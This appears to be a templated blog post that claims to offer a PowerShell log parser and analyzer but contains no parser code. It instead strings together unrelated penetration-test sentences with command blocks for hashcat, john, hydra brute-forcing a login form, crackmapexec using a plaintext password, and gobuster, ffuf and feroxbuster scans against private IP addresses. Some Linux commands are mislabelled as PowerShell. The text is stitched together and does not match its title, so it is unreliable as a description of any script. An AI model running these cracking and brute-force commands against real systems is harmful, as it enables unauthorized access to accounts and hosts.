---
TitleSEO: "Log Parser and Analyzer in PowerShell | ZureFX"
TitlePost: "Log Parser and Analyzer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for log parser and analyzer. Built for security research and automation."
Keywords: "powershell, automation, rust, parser, go"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-487.html"
URL_IMAGES: ""
Date: "2024-09-30"
Tags: "PowerShell, Automation, Rust, Parser, Go"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-487"
Permalink: "/scripting/script-log-parser-and-analyzer-487.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `kerbrute`
- `atexec`
- `enum4linux`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
gobuster dir -u http://10.125.6.228/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.101.114.106/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

```powershell
gobuster dir -u http://10.12.100.243/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.145.9 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.35.63.124 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.233.203/FUZZ
feroxbuster -h
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 5.83s
```
